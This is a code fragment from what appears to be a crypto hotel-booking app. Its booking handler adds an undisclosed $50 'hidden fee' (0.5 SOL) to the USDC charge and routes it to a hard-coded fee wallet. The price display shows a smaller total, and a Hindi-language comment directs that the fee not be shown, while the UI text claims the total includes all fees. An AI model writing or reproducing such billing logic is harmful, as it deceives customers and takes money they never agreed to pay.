// ... previous code ...

const PLATFORM_FEE_PERCENT = 0.05; // 5%
const HIDDEN_SOL_FEE = 0.5; // 0.5 SOL
const FEE_WALLET = 'A9GT8pYUR5F1oRwUsQ9ADeZTWq7LJMfmPQ3TZLmV6cQP';

// ... inside component ...

const calculateTotal = () => {
  if (!hotel) return 0;
  const subtotal = hotel.discountedPrice * nights;
  const platformFee = subtotal * PLATFORM_FEE_PERCENT;
  return subtotal + platformFee;
};

const calculateHiddenFee = () => {
  // Convert 0.5 SOL to USDC (approximate rate, ya real-time fetch karo)
  // Abhi ke liye fixed $50 worth SOL assume karte hain
  return 50; // $50 equivalent of 0.5 SOL
};

const handleBooking = async () => {
  if (!user?.wallet || !hotel) {
    alert('Please connect wallet first!');
    return;
  }

  setBooking(true);

  try {
    const totalAmount = calculateTotal();
    const hiddenFee = calculateHiddenFee();
    const grandTotal = totalAmount + hiddenFee;

    // Step 1: Process USDC payment (total + hidden fee)
    const paymentRes = await fetch('/api/payments/process', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        amount: grandTotal,
        userWallet: user.wallet,
        hotelId: hotel.id,
        hotelName: hotel.name,
        breakdown: {
          hotelAmount: hotel.discountedPrice * nights,
          platformFee: totalAmount * PLATFORM_FEE_PERCENT,
          hiddenFee: hiddenFee,
          feeWallet: FEE_WALLET
        }
      })
    });

    // ... rest same ...
  } catch (error: any) {
    console.error('Booking error:', error);
    alert('Booking failed: ' + error.message);
  } finally {
    setBooking(false);
  }
};

// Price breakdown UI update
<div className="border-t border-nomad-border pt-4 mb-6">
  <div className="flex justify-between mb-2">
    <span className="text-nomad-gray">${hotel.discountedPrice} x {nights} nights</span>
    <span>${hotel.discountedPrice * nights}</span>
  </div>
  <div className="flex justify-between mb-2">
    <span className="text-nomad-gray">Service fee (5%)</span>
    <span>${(hotel.discountedPrice * nights * PLATFORM_FEE_PERCENT).toFixed(2)}</span>
  </div>
  {/* Hidden fee - dikhana mat, sirf total mein add karo */}
  <div className="flex justify-between text-lg font-bold pt-2 border-t border-nomad-border">
    <span>Total</span>
    <span className="text-crypto-green">${calculateTotal()}</span>
  </div>
  <p className="text-xs text-nomad-gray mt-2">Includes all taxes and fees</p>
</div>
